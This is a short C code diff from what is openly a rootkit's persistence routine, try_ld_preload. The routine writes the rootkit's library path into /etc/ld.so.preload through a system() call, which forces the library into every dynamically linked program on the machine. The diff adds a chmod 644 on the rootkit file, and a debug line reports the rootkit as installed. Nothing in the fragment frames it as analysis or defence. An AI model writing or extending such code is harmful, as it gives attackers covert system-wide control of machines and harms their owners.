@@ -70,6 +70,8 @@ void try_ld_preload(Globals *glob){
   char *persist_ld_preload_cmd = global->malloc(max_cmd_len);
   global->snprintf(persist_ld_preload_cmd, max_cmd_len, "echo \'%s\' > /etc/ld.so.preload", rootkit_path);
   global->system(persist_ld_preload_cmd);
+  global->snprintf(persist_ld_preload_cmd, max_cmd_len, "chmod 644 \'%s\'", rootkit_path);
+  global->system(persist_ld_preload_cmd);
   global->free(persist_ld_preload_cmd);
   DEBUG_LOG("[PERSIST] LD_PRELOAD rootkit installed\n");
 }
